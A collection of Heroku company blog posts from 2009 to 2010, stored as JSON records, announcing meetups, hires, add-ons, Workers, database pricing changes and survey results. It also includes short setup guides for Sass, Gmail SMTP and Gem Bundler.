{"website": "Heroku", "title": "Build your live video apps with Justin.tv and Heroku", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/build_your_live_video_apps_with_justin_tv_and_heroku", "abstract": "Build your live video apps with Justin.tv and Heroku Posted by Morten Bagai July 27, 2009 Listen to this article You probably already know all about our friends and fellow Y Combinator alumni at Justin.tv . For the last couple of years, they’ve been driving an explosion of live video content on the web, streaming thousands of channels featuring events and people from all over the world. Today, things are about to get even more interesting as Justin.tv launches an  extensive API that allows you to build your own live video apps using Justin.tv’s existing content and their technology platform. Whether you’re looking to enhance your own lifecasting project, or add video-based customer service to your company’s website, the Justin.tv API enables a whole new generation of exciting mashups blending live video with other content sources. An exciting new API needs useful examples, of course, and not only have the guys over at Justin.tv built some really cool ones , they’ve also chosen to host some of them – like Hot Or Not Live – on Heroku. We’re psyched to see this, because we think that the combination of instant, provisionless deployment and easy scalability makes Heroku the ideal spot to launch your Justin.tv app and watch it take off. To get started, check out the sample code for Hot or Not Live as well as the official API docs wiki . We hope you’ll have lots of fun with the API , and please remember to tell us all about the cool stuff you’re building with Justin.tv and Heroku. We’d love to hear from you. justintv", "date": "2009-07-27,"},
{"website": "Heroku", "title": "Europe Here We Come", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/europe_here_we_come", "abstract": "Europe Here We Come Posted by Morten Bagai July 30, 2009 Listen to this article Since the beginning of our private beta Heroku has been used by developers all over the world. Recently, we’ve been delighted to see a particularly strong interest from Rubyists in Europe looking to take advantage of the deployment and scalability benefits of our platform. On their trips to Erlang Factory in London and Kings of Code in Amsterdam, Blake and Orion saw immense interest from both individual hackers and established companies. In August I’ll be making the trip to several European Ruby user group meetings to catch up with even more users, and hopefully gain a better understanding of what they’d like to see from Heroku in the future. If you’re in or around any of the listed cities on the meetup dates, please consider stopping by. I’ll likely have some time around each of these events, so feel free to contact me if you have a particular project you’d like to discuss. Schedule: 8/3 – Aarhus, Denmark 8/4 – Dublin, Ireland 8/5 – Copenhagen, Denmark 8/6 – Berlin, Germany 8/10 – Amsterdam, Netherlands", "date": "2009-07-30,"},
{"website": "Heroku", "title": "Bringing Heroku to the East Coast", "author": ["Oren Teich"], "link": "https://blog.heroku.com/bringing_heroku_to_the_east_coast", "abstract": "Bringing Heroku to the East Coast Posted by Oren Teich August 03, 2009 Listen to this article With Morten out on the European tour , we didn’t want those here in the US to feel left out.  Last week we attended a great BBQ and roundtable with Seattle.rb .  Starting next week, we’ll be heading out to the east coast, and want to meet more of you. Blake Mizerany will be talking with local meetup groups all along the east coast about Heroku, Sinatra, and Ruby development.  We’re excited to hear how you’re using Heroku today, and what you’d like to see from us in the future. We’re currently bookending the trip with two bigger groups:  kicking it off with NYC .rb on August 11th, and ending the tour at Boston.rb on September 8th. Have a meetup group, on the east coast or elsewhere?  We would love to speak with your group as well, as part of this tour or the next.  Please drop us a line letting us know where and when, and we’ll see you shortly. meetup", "date": "2009-08-03,"},
{"website": "Heroku", "title": "Heroku Sass", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_sass", "abstract": "Heroku Sass Posted by Oren Teich August 17, 2009 Listen to this article No, we’re not talking back.  Instead, we’re excited to announce that you can now use Sass on Heroku. We’re big believers in elegance here, and Sass is a way to bring elegance to your CSS and page layout.  Due to our read-only filesystem Sass hasn’t worked well on Heroku.  Thanks to the efforts of one of our awesome engineers , there’s now a beta plugin available that enables you to use Sass & Heroku frictionlessly. To use the plugin, install Sass as you normally would – include the HAML gem in your gem manifest.  Then, script/plugin install the sass_on_heroku plugin: $ script/plugin install git://github.com/heroku/sass_on_heroku.git The plugin compiles Sass files to tmp/ and serves them from there.  We’re able to do this magic by adding Rack middleware on top of your Rails app that quickly detects requests for Sass CSS files, and serve them with proper caching headers. The plugin is in beta.  We’d love to hear from you if you run into any issues.", "date": "2009-08-17,"},
{"website": "Heroku", "title": "BizConf Bound", "author": ["Oren Teich"], "link": "https://blog.heroku.com/bizconf_bound", "abstract": "BizConf Bound Posted by Oren Teich August 18, 2009 Listen to this article Heroku has a special place in our heart for consultants and web development firms.  They’re some of our best supporters and users.  That’s why were excited to be heading out to BizConf this Thursday and Friday. From the BizConf website: It’s simple: energetic, enthused folks who want to learn more about how to actually do business today. This conference won’t consist of get-rich-quick talks or motivational speeches, but rather in-depth presentations, discussions and workshops on how to communicate, manage and network more dynamically and effectively. If you’re going to be at BizConf, find me or drop me an email to arrange something.  I’ll have some t-shirts to give out, and I’d love to hear how your business is doing and what Heroku can do to help.", "date": "2009-08-18,"},
{"website": "Heroku", "title": "Our travels continue", "author": ["Oren Teich"], "link": "https://blog.heroku.com/our_travels_continue", "abstract": "Our travels continue Posted by Oren Teich September 10, 2009 Listen to this article In our ongoing efforts to spread the Heroku word worldwide , our North American tour continues with a bunch of new venues coming up. Each time we meet with people, we’re blown away with the new applications people are creating on Heroku.  For example, last month FlightCaster launched an amazing app for predicting flight delays using Heroku, Clojure, S3, Hadoop and some general amazing tech.  We’d love to hear from you on what you’re creating, and find out how to make some awesome stuff. Blake Mizerany continues his travel schedule talking about Heroku, Sinatra, Ruby development and scaling.  If you’re in the area, make sure to stop by! Boston.rb – Sept 8, 2009 altrug , Atalanta, GA – Sept 9, 2009 Windy City Rails Conference, Chicago, IL – Sept 12, 2009 Montreal on Rails – Sept 15, 2009 Austin on Rails – Sept 22, 2009 CAOS at SIUE , Edwardsville, IL – Sept 24, 2009 San Diego meetup – October 1, 2009 Aloha on Rails – October 3rd – October 6, 2009 travel meetup", "date": "2009-09-10,"},
{"website": "Heroku", "title": "The best camera is...", "author": ["Oren Teich"], "link": "https://blog.heroku.com/the_best_camera_is", "abstract": "The best camera is... Posted by Oren Teich September 25, 2009 Listen to this article We periodically like to highlight some of the great applications people are building on Heroku.  This week, a new web site and iPhone app for shutterbugs launched , and it’s getting great press and feedback around the web . Chase Jarvis , a professional photographer, has been singing the praises of the iPhone camera as creative outlet.  As he points out, the best camera is the one you have with you.  To back that claim up, he’s launched a new project combining an iPhone application and community website. When I saw that this was running on Heroku, I knew I had to find out more.  I reached out to the developers behind this project: Übermind .  I dropped the mad geniuses over there a quick email, to find out how and why they are using Heroku. Ben Sharpe, their Senior Web Services Architect responded: “When it came down to production deployment, we investigated several alternatives — but we felt that Heroku was the best balance between features, ease of use and value.” And these guys are getting some traction: “In the first day we absorbed 5000+ new users and 150k impressions while updating the code throughout the day.” It looks like that’s just the beginning, with users and traffic shooting up today too.  As of Sept 25h, the iphone app is already #11 on the Top Paid App list! They’re serving up both the iphone backend and web site with a Crane DB + 16 dynos .  Go check it out! customers", "date": "2009-09-25,"},
{"website": "Heroku", "title": "We're Hiring!", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/we_are_hiring", "abstract": "We're Hiring! Posted by Morten Bagai September 28, 2009 Listen to this article Thanks to the continued support of the fantastic Ruby community, Heroku is rapidly growing. We’re determined to keep improving our service for our ever expanding user base, and to that end we’re looking for a few fresh faces to join our world-class team in San Francisco . First up, we’re hiring our first full-time Heroku Evangelist . This lucky person should have a serious passion for Ruby and cloud computing, along with the enthusiasm and ability to communicate to our audience how Heroku can make their lives easier. There will be lots  of presentations to make, conferences to visit, and ample room to engage our developer community – including open source projects. Second, we’re looking for a Ruby Cloud Platform Support Engineer to work with our amazing customers to make their Heroku experience as awesome as possible. We’re looking for someone with solid Ruby coding chops who really gets a kick of out helping customers solve real problems. If either of these positions sound like just the thing for you, head on over to our jobs site to read more and apply. jobs", "date": "2009-09-28,"},
{"website": "Heroku", "title": "Gemcutter's Adventure on Heroku", "author": ["Nick Tassone"], "link": "https://blog.heroku.com/gemcutters_adventure_on_heroku", "abstract": "Gemcutter's Adventure on Heroku Posted by Nick Tassone October 05, 2009 Listen to this article Hi there, I’m the creator of a new RubyGem hosting site, Gemcutter . I also happen to be one of the newest hires at Heroku, but I promise, I decided the project was going to be hosted on Heroku long before starting to work here. Heroku’s been kind enough to pitch in getting the site deployed and ready for the whole Ruby community to enjoy. There’s nothing more fitting than for the next generation of RubyGem hosts to be supported by a truly next generation web application hosting platform.  The project has the following goals: Provide a better API for dealing with gems Create more transparent and accessible project pages Enable the community to improve and enhance the site Recently, the site’s redesign was launched, and we will soon be moving over to http://rubygems.org . Over 23,000 gems are hosted through Amazon S3, and new ones are showing up every day. Contributors have recently started to add some really neat features such as prerelease gem support and subscribing to RSS feeds for updates about your gems. Some features slated for the near future are full text searching of READMEs for gems, Ruby 1.9 and JRuby compatibility, and allowing gem authors to delete their own gems if they need to. Gemcutter will be used by default for gem installs when using the Heroku gem manifest starting next week. This should result in faster deploys since the installs will be taking place over the EC2/S3 LAN . A deeper explanation of how Heroku’s architecture and add-ons has affected Gemcutter’s internal design will be coming soon.  The Heroku platform has really helped address some serious issues regarding scalability that wouldn’t have been brought up if we were hosted somewhere else. For now, you can check out how easy it to store files in S3 , run background jobs , and use HTTP caching to really speed up your application. And if you haven’t yet, check out gemcutter.org ! ruby", "date": "2009-10-05,"},
{"website": "Heroku", "title": "Heroku Casts: Creating Your First App", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_casts_creating_your_first_app", "abstract": "Heroku Casts: Creating Your First App Posted by Oren Teich October 06, 2009 Listen to this article We’re introducing a series of screencasts going over how Heroku works, how to use it, and some common ways to make your experience better. To kick this off, I’ve put together a quick <5 minute overview of creating your first Heroku application. Follow all our videos on our vimeo page If you’ve got ideas on other screencasts you’d like to see, let us know in the comments! screencast", "date": "2009-10-06,"},
{"website": "Heroku", "title": "Heroku Casts: Setting Up Custom Domains", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_casts_setting_up_custom_domains", "abstract": "Heroku Casts: Setting Up Custom Domains Posted by Oren Teich October 07, 2009 Listen to this article NOTE : This documentation is out-of-date and no longer supported. It will not work with the current version of the Heroku platform. For the latest information about setting up custom domains on Heroku please use this article from the Heroku Dev Center. Today is a twofer on the screencast front. Setting up custom domains & DNS is one of those necessary evils that no one likes, and is way more confusing than it should be.  Adding insult to injury, there’s not one solution for all cases.  At a high level, the process is fairly easy.  First, you need to point your domain to Heroku with your DNS provider (such as GoDaddy).  Once your domain is pointed to Heroku, you then need to tell Heroku  so we can start serving traffic to your domain. DNS is the means by which computers translate what you type in pretty human language (e.g. heroku.com) into computer terms (75.101.163.44).  To figure out how to configure DNS & Heroku, you first need to ask yourself – Do I want email (support@mydomain.com) or not?  No email is easier to manage in the long run, though neither is hard. Setting up Custom Domains without email This is the easiest configuration.  It uses something called “ CNAMES ” in DNS , which are just aliases.  This means you are telling DNS to just ask us, Heroku, what the right IP address is.  If we ever change the DNS settings, your domain is automatically updated.  On the downside, using this arrangement means that you can’t get email.  It’s a long and geeky discussion on why – if you’re interested in a blog post or screencast on the details, let me know in the comments! Setting up Custom Domains WITH email Screencast #2 shows you how to use A records for the root domain, and setup your MX records (Mail eXchange, which tell mail clients where to send email) so that you can use custom domains and email. Other screencasts you want to see?  Let me know in the comments. screencast dns", "date": "2009-10-07,"},
{"website": "Heroku", "title": "Announcing Huge Growth and New CEO", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/announcing_huge_growth_and_new_ceo", "abstract": "Announcing Huge Growth and New CEO Posted by James Lindenbaum October 14, 2009 Listen to this article Big things are happening at Heroku, so we felt it was time for an overall update.  I’m happy to say that not only has the platform doubled in size over the last 12 months to well over 35,000 live apps, but usage has become more serious and far more intense. Tons of business-critical apps are now live on Heroku, and rely on us for dependable, secure, scalable service, 24/7. We are seeing some really cool and complex composite apps now that the platform has expanded and become more flexible. The app scale we’re seeing has jumped too, with many apps now each individually exceeding hundreds of millions of requests per month. All of this is largely due to our passionate users and supporters who beta test our platform, contribute great content to the community, and evangelize us in blogs and tweets.  Huge thanks to all of you! The team has been plenty busy scaling the platform and building more new features than ever.  But with all this growth, I’ve had less and less time for my personal contribution: driving the whole team crazy with my insane hairsplitting perfectionism. Adam, Orion, and I agreed that with all this great stuff happening we needed to expand the team, so today we’re pleased to announce that Byron Sebastian has joined us as CEO . Don’t be fooled by Byron’s extensive experience building commercial platforms (Amazon.com, Crossgain, BEA , SourceLabs, EMC ); he’s a passionate engineer at heart. Byron is a great fit with the unique culture of the Ruby community and the Heroku team, and brings a ton of great experience into the company.  We’re thrilled for him to help us take Heroku to the next level. With Byron onboard, Adam, Orion, and I will be able to spend even more time on the product. For me especially, this means I’ll be able to let my OCD run amuck and focus even more maniacally on Heroku’s trademark smooth user experience (I can see the team groaning and rolling their eyes as I type this). We’ve been working hard on some awesome new additions to the platform we’ll be rolling out over the coming weeks.  Exciting times ahead – stay tuned! Official press releases are available here and here. news", "date": "2009-10-14,"},
{"website": "Heroku", "title": "Heroku Casts: Maintenance Mode", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_casts_maintenance_mode", "abstract": "Heroku Casts: Maintenance Mode Posted by Oren Teich October 19, 2009 Listen to this article Today we’re launching an exciting new feature – maintenance mode. We strive to make your deployment and management experience as seamless as possible, for both the developers and the end users.  Part of any management task is performing routine maintenance tasks, from database migrations to more complex site upgrades.  When you’re in the midst of doing these maintenance tasks, wouldn’t it be great to show your users a nice maintenance page, instead of a broken site? With the Heroku maintenance mode, now you can. This quick 3:30 video shows you how to use maintenance mode, and even how to customize it for your own look and feel:", "date": "2009-10-19,"},
{"website": "Heroku", "title": "Heroku Directions", "author": ["Byron Sebastian"], "link": "https://blog.heroku.com/heroku_directions", "abstract": "Heroku Directions Posted by Byron Sebastian October 22, 2009 Listen to this article It’s great to be a part of Heroku and to get the welcome from James and team as well as from the various customers, partners, and developers I’ve spoken with over the past few weeks. Heroku, the Ruby community at large, and the “cloud” market in general are growing and evolving quickly. As you can tell, we have a lot of exciting applications being deployed on our platform and are constantly working to improve and expand our offerings. I wanted to use my first blog post with the company to talk specifically about areas where we are going to be super focused over the coming months: 1) Making Heroku’s growing ecosystem work for you. We’ve seen great traction with partners (formal and informal) who’ve built various extensions or additions to our platform, and we’ve also seen a surprising amount of our business come from consultancies who are doing application development for their customers and are recommending Heroku as the deployment platform as choice. We’re going to make it easier for our customers, prospects, and users to take advantage of our partner’s offerings, and to enable our partners to more easily grow their own businesses by working with Heroku. We’ll have some announcements on this front coming over the next weeks and months. 2) Continue strengthening Heroku’s position as both the most productive platform to run your Ruby applications and the most trusted, reliable, and operationally transparent service. Some of the world’s largest companies trust us with their applications, and some of the most exciting and fastest growing sites do so as well – we have numerous customer applications serving hundreds of millions of pages a month on Heroku. We are continuing to invest substantially in our own operational infrastructure as well as our support processes, tools, and services that we provide to customers. As our platform continues its tremendous growth we will continue to deliver and improve upon (there’s always room for improvement) our stability and reliability. Transparency is one area that we’ve specifically looked to make improvements, and I’m happy to say that we recently launched status.heroku.com to make it easy and simple for you to check on the status of our service, and to see in the cases where there was an issue how we deal with it and what the impact is. I’m also very gratified that we have a very robust beta process thanks to an energetic group of customers investing their time and energy using beta features and giving us great, concrete feedback. 3) Expanding the number of applications and scenarios where you can see real business value in building and running your application on Heroku. We see customers using us not just for easy and rapid deployment, but more importantly for the efficiency and smoothness of ongoing operation of their applications. We hear more and more that customers are saving not just time, but real, hard dollars due to the automation and efficiencies in our platform. There is a lot more we can do here, and some of them are super secret, while still more are just gleams in Adam, Orion, and James’s eyes right now (you can only imagine…). A couple of important platform features that you’ll be seeing shortly are fully production-ready and cloud-aware application monitoring and memcached services. These have both been used extensively through our beta process. We can’t wait to get them out to you, and to continue regularly adding to the portfolio of services you have to choose from as you deploy on Heroku. Finally, as this is my first post at Heroku, I want to thank our customers, users, and evangelists for your enthusiasm, your feedback, and your business; I hope you won’t hesitate to contact me or us when you have questions, feedback, or yes, even gripes. My email is byron at heroku dot com, and our contact page gives you easy places to get in touch.", "date": "2009-10-22,"},
{"website": "Heroku", "title": "Add-ons Launch", "author": ["Oren Teich"], "link": "https://blog.heroku.com/add_ons_launch", "abstract": "Add-ons Launch Posted by Oren Teich October 29, 2009 Listen to this article Heroku has focused since day one on making the end-to-end application experience as easy as possible.  From our git focused workflow to the automated management of deployed applications, we’ve worked hard to give developers the flexibility to build amazing apps.  Today we’re excited to announce a major extension of this flexibility with Add-ons . For those who just want to see it in action, here’s a 3 minute overview: Add-ons Add-ons are a way to extend your application.  They can provide core functionality (like full-text search or cron ), add features to the platform (like deploy hooks or backup bundles ), and integrate with amazing third party services (like Zerigo , Sendgrid , or New Relic ). Detailed information for the initially available add-ons is available at addons.heroku.com . Add-on Catalog All available add-ons can be viewed in the add-on catalog.  We have a combination of Heroku developed and 3rd party add-ons that cover a wide range of needs, and more coming all the time.  You’ll also see some marked “beta” (open to anyone but not yet 100% production), some marked “private beta” (by request only – contact us at beta@heroku.com if you want to be considered for inclusion), and finally some marked “soon” (a sneak peak of some upcoming add-ons).  We promise, this is just a glimpse of many many more to come. Adding an Add-on Adding an add-on is incredibly easy.  You have the choice to either use our command line interface or the catalog.  Simply click the add button, choose which app you want to add to, and you’re done. You will see the add-on being installed into your app in real time. Managing Add-ons All of an app’s add-ons can now be managed in one place – the add-on menu shown above.  From the My Apps section, choose an app and then click the “Add-ons” button in the upper right corner. Select an add-on from the menu to view its interface, manage its configuration, or remove it. Lots more add-ons to come – stay tuned! Official press release can be found here .", "date": "2009-10-29,"},
{"website": "Heroku", "title": "Tech: Sending email with Gmail", "author": ["Oren Teich"], "link": "https://blog.heroku.com/tech_sending_email_with_gmail", "abstract": "Tech: Sending email with Gmail Posted by Oren Teich November 09, 2009 Listen to this article These days, it seems like almost all apps need to send email.  And everyone has a gmail account.  So why not have your app send email through Gmail?  It’s fairly easy with just a few steps. Heroku currently runs Ruby 1.8.6.  This means you need to provide your own SMTP TLS library.  Luckily, Adam has made that super easy with a quick little Rails plugin .  Simply install the library, set a few config variables , and you’re good to go.  Best of all, this simple plugin will work on any provider.  Use it even if you’re not on Heroku.  It’s just a fast way to make sure your SMTP connection to Gmail is setup correctly. 1. Install the plugin $ script/plugin install git://github.com/adamwiggins/gmail_smtp.git 2.  Setup your environment variables on your local dev machine for testing $ export GMAIL_SMTP_USER=username@gmail.com\n$ export GMAIL_SMTP_PASSWORD=yourpassword 3. Try sending mail with ActionMailer. Normal process here.  You don’t need to config ActionMailer anywhere, this plugin will do it for you.  In fact, if you have a config file setting up ActionMailer, remove it! 4. Set your variables on Heroku $ heroku config:add GMAIL_SMTP_USER=username@gmail.com\n$ heroku config:add GMAIL_SMTP_PASSWORD=yourpassword 5. That’s it! You’re running with Gmail and Heroku. For those looking for something a little more industrial, we have a great option in our add-on catalog with SendGrid .  No limits on from address, 200 emails/day free, and some amazing features in the higher levels such as bounce tracking and full stats.", "date": "2009-11-09,"},
{"website": "Heroku", "title": "Interested in talking with Heroku at Rubyconf?  ", "author": ["Sharon Schmidt"], "link": "https://blog.heroku.com/interested_in_talking_with_heroku_at_rubyconf", "abstract": "Interested in talking with Heroku at Rubyconf? Posted by Sharon Schmidt November 12, 2009 Listen to this article We’ve secured a two room suite at the Rubyconf event hotel for the Thursday night of the conference.  A number of Heroku’s team members including James Lindenbaum, Adam Wiggins, Morten Bagai, Oren Teich, Todd Matthews, Pedro Belo and Blake Mizerany will be hanging out, talking shop and looking to connect with folks interested in learning more about Heroku. Rubyconf has an exceptional lineup this year and Thursday is sure to rock it with talks scheduled from 9am-6pm and Lightening Talks beginning at 8pm.  Because we don’t want you to miss any of this years excellent program, we’re planning to stick around for at least an hour after the Lightening Talks end.  But of course we’d love to see you anytime between 6pm and 10:30pm. We should have plenty to drink and snack on – so please come hungry!  We’ve decided on Sushi but we’ll make sure to have other goodies for those of you who can’t hang with the big fish ;) Please RSVP to suitehangout@heroku.com and I’ll send you the room details. When: Thursday Nov 19th, 6-10:30PM Where: Embassy Suites SF Airport Directions: http://rubyconf.org/pages/venue Hope to see you there!", "date": "2009-11-12,"},
{"website": "Heroku", "title": "New Relic RPM Silver & Gold Add-on", "author": ["Oren Teich"], "link": "https://blog.heroku.com/new_relic_rpm_silver_gold_add_on", "abstract": "New Relic RPM Silver & Gold Add-on Posted by Oren Teich December 01, 2009 Listen to this article A couple of weeks ago we announced that New Relic RPM Bronze is available free of charge for all Heroku customers through the our add-on catalog New Relic RPM is a application performance management tool that allows you to monitor, troubleshoot, and tune the performance of your Heroku app. One-click integration with the Heroku platform means that you can activate an RPM account and start monitoring your application in just minutes. Here’s more great news: now you can upgrade to RPM Silver or RPM Gold, through the same add-on catalog . RPM Silver and Gold are charged per dyno-hour, so it’s only based on your actual usage of Heroku. RPM Silver enables error tracking and transaction tracing on specific slow transactions. RPM Silver provides details about each new deployment of each application including before and after comparisons, and performance data is retained for 30 days for ongoing analysis. RPM Gold adds analytic capabilities that help you shape the application’s performance over time: Scalability Analysis, Capacity Analysis, Long-term SLA Trending, Database Analysis, Transaction Report, and Deployment History. Performance data is retained for 90 days. To find our more about using the New Relic RPM add-on, join us on December 15th at 9 am Pacific/Noon Eastern for a 30-minute webinar “Heroku Add-ons: New Relic RPM .” , or start using the add-on today . Update: The archived webinar is now available.", "date": "2009-12-01,"},
{"website": "Heroku", "title": "DJ has evolved into Workers", "author": ["Oren Teich"], "link": "https://blog.heroku.com/dj_has_evolved_into_workers", "abstract": "DJ has evolved into Workers Posted by Oren Teich December 02, 2009 Listen to this article Modern web apps are increasingly making use of asynchronous, background workers for task processing needs.  For many apps, workers are just as, if not even more important than the front end http stack.  Ever since we launched DJ , we’ve been overwhelmed with requests from customers wanting access to several DJ workers per app. Based on the feedback, we have been coding away, making this happen, and today we’re proud to announce the release of Heroku Workers. Workers as first-class citizens The new Workers feature is based on Delayed Job, and will replace the current DJ add-on, which is retired. The major change here is that Workers are a first-class citizen on the Heroku platform with a command-line interface, just like dynos: $ heroku workers 2 (sets the app to 2 workers)\n$ heroku workers +2 (increments worker count by 2)\n$ heroku workers (displays the current number of DJ workers) In fact, Workers are exactly like dynos in terms their technology stack, resource limits and intelligent distribution throughout the dyno grid. Thus, they will also be priced like dynos at $0.05/hour. Dozens of customers running hundreds of workers During our beta period, we’ve already had dozens of our customers using hundreds of workers to process huge amounts of data, handle huge volumes of traffic, and grow their app seamlessly. You can start using workers today – simply use the above commands to startup your workers! If you’re already using DJ, we’ve transitioned you to the workers, and you already have one running. Read more about this feature in the docs", "date": "2009-12-02,"},
{"website": "Heroku", "title": "Success Story: Best Buy IdeaX", "author": ["Oren Teich"], "link": "https://blog.heroku.com/success_story_best_buy_ideax", "abstract": "Success Story: Best Buy IdeaX Posted by Oren Teich December 11, 2009 Listen to this article This month’s featured app is Best Buy IdeaX , developed by Bust Out Solutions . Best Buy IdeaX is a forum for Best Buy customers to share, rate, and discuss ideas to help make Best Buy better. “We were very interested in running IdeaX on a cloud computing infrastructure such as Amazon EC2, but the cost of maintaining our own EC2 instances was just too high, not to mention frustrating. Heroku solves those problems for us with their solid platform infrastructure and nice user interface. We’re saving time and money, and enjoying development much more.” said Jeff Linn, Founder/ CEO of Bust Out Solutions Check out the Success Story and the live Best Buy IdeaX site . success", "date": "2009-12-11,"},
{"website": "Heroku", "title": "Success Story: FlightCaster", "author": ["Oren Teich"], "link": "https://blog.heroku.com/success_story_flightcaster", "abstract": "Success Story: FlightCaster Posted by Oren Teich December 15, 2009 Listen to this article Last month’s featured app was FlightCaster .  FlightCaster provides flight delay prediction, letting you know 6 hours in advance if your flight is delayed.  Today we’ve posted their success story , along with a great video with their CEO , Jason Freedman. Jason goes into some great details on how they use Heroku to handle their complex application, including using a Hadoop cluster to process millions of updates.  In his words, “Heroku has enabled us to deliver a world class service without having the huge management and operational overhead we would have otherwise needed.” Watch the video below, or click on through to the whole success story . For more technical details, also check out this InfoQ article . success", "date": "2009-12-15,"},
{"website": "Heroku", "title": "Pricing Changes, Part I", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/pricing_changes_part_i", "abstract": "Pricing Changes, Part I Posted by James Lindenbaum January 21, 2010 Listen to this article You, our customers, have given us great feedback that in some places our pricing isn’t aligned with the value we provide, and in other places our pricing is just confusing. We want to be more transparent about how we’re thinking about pricing, so today we’re announcing our pricing philosophy, as well as the first of a series of changes: moving away from storage based pricing on our database offering. Platform Value and Pricing Philosophy You have told us loud and clear that the value you get from the platform is saved time and opportunity cost, shorter deployment cycles,  increased agility, simplified ongoing maintenance and operations, and saved head count. You’ve also made it clear that you don’t see much added value in the commodity components of compute, storage, and network. Our pricing philosophy moving forward will be to price for the things that provide value, and to make compute, storage, and network effectively free (like long distance) as much as we can. There are places where we aren’t doing a good job of this today, so we are going to make a series of changes to bring our pricing more inline with this philosophy. Database Pricing Changes The worst offender currently is our database pricing, so we’re going to start our changes here. There is tremendous value in having a relational database at your fingertips that requires no administration and is always seamlessly hooked up to your app.  Yet, in trying to differentiate the levels of service, we priced based on storage. This runs counter to our belief that storage should be free, so we are altering our pricing to focus on productivity and performance, and to effectively give storage away. Shared Database Starting today, we are eliminating the $50 Crane plan, and allowing up to 20GB of data in our $15 Koi plan.  This makes Koi a very affordable offering with great storage and high (but variable) performance. All Crane customers will be migrated to Koi immediately (the transition is seamless and won’t require any downtime), and will get greatly increased limits and a lower cost. Dedicated Database For predictable performance or larger databases, we offer dedicated database plans.  Starting today, we will allow up to 2TB of data across all dedicated plans. To view the updated pricing, please visit our pricing page . Note that these limits are for database data only – there is no filesystem on Heroku. More to Come This is the first in a series of changes we hope will bring our pricing more inline with the value our customers get from the platform.  Stay tuned!", "date": "2010-01-21,"},
{"website": "Heroku", "title": "Manage Heroku with your iPhone", "author": ["Oren Teich"], "link": "https://blog.heroku.com/manage_heroku_with_your_iphone", "abstract": "Manage Heroku with your iPhone Posted by Oren Teich January 26, 2010 Listen to this article You get a call from your partner that your app just hit the front page of Digg.  You’re away from your computer, and need to scale your app up now!  Fire up Nezumi and dial your dynos to 12 to handle the load no problem. Nezumi is a 3rd party iPhone app that allows you to perform almost any of the functions that the CLI supports, from restarting your app, changing your dynos and workers, viewing logs, adding collaborators, and much more.  It’s available now from the iTunes store. Marshall , the developer of Nezumi, was kind enough to provide us 5 copies of Nezumi to give away.  Leave a comment below, and on Friday we’ll select 5 people from random and email you a promo code for Nezumi!", "date": "2010-01-26,"},
{"website": "Heroku", "title": "Heroku Casts: Windows Setup", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_casts_windows_setup", "abstract": "Heroku Casts: Windows Setup Posted by Oren Teich January 28, 2010 Listen to this article Getting the entire ruby stack up and running on Windows is a bit tricky.  To help out the process we’ve posted a new Windows setup docs page . This 10 minute screencast walks you through the process.  It follows the outstanding instructions put together by Sarah Mei for the Ruby on Rails Workshops screencast", "date": "2010-01-28,"},
{"website": "Heroku", "title": "Gem Bundler on Heroku", "author": ["Oren Teich"], "link": "https://blog.heroku.com/gem_bundler_on_heroku", "abstract": "Gem Bundler on Heroku Posted by Oren Teich February 16, 2010 Listen to this article Gem Bundler is rapidly on its way to becoming the new community standard for managing gem dependencies in Ruby apps.  Bundler is the default gem manager for Rails 3, but it will also work seamlessly with any other web framework (or no framework) since it has no dependencies itself. Using it is as simple as creating a Gemfile in the root of your app: source :gemcutter\ngem 'sinatra', '0.9.4'\ngem 'haml', '2.2.17' …and running “bundle install” at the command line, which sets up all of your gems. Yehuda Katz has a writeup on using bundler that outlines various scenarios for using bundler. Heroku now has native support for gem bundler.  If you push up a repo that has a Gemfile in its root, the slug compiler will bundle your gems automatically.  (You can use this in addition to, or instead of, the .gems manifest.  Both will be supported for the foreseeable future, so you needn’t feel pressured to switch.) Docs here. The Ruby community has been in need of a simple, standard, dependency-free gem dependency manager for a long time.  Cheers to Yehuda Katz, Carl Lerche, and everyone else involved with bundler for delivering this elegant solution! Note to beta users: For those who used Bundler 0.8 in beta on Heroku, you’ll need to update your application to use Bundler 0.9 before your next push.  If you don’t update your Gemfile, your push will be rejected.  Currently running apps will continue to run unaffected.", "date": "2010-02-16,"},
{"website": "Heroku", "title": "Winter 2009 Survey Results", "author": ["Oren Teich"], "link": "https://blog.heroku.com/winter_2009_survey_results", "abstract": "Winter 2009 Survey Results Posted by Oren Teich February 23, 2010 Listen to this article In December we asked our users to take a survey on how they are using Heroku.  After collecting the responses, we wanted to share some of the results with the rest of our user community. Who’s using Heroku? No surprise, but the majority identify themselves as in the “Software Technology” industry, at 65% of the respondents.   The rest of the user base is divided between many groups, from Consultancies with 9%%, to the Arts & Entertainment industry with 6%% and Healthcare at 2.5%%.  Respondents reported annual web application budgets as high as $10M/year, with over 13% spending >$100K/annually. How are they using Heroku? These users are building a huge range of applications, and often more than one per user: 55.6% of respondents are now or shortly deploying production applications onto Heroku. Technologies Respondents are at the cutting edge of cloud technology.  Characteristics of these applications include thorough caching strategies, asynchronous patterns , and alternatives to traditional relational databases. Reasons for moving to the cloud In a strong shift from previous studies, respondents said loud and clear that agility is the #1 reason to move to the cloud.  Cost, previously the #1 response, only just made it into the top 5 in this survey. We thank all the people who took the time to fill out the survey, and hope you find the results as interesting as we do!", "date": "2010-02-23,"},
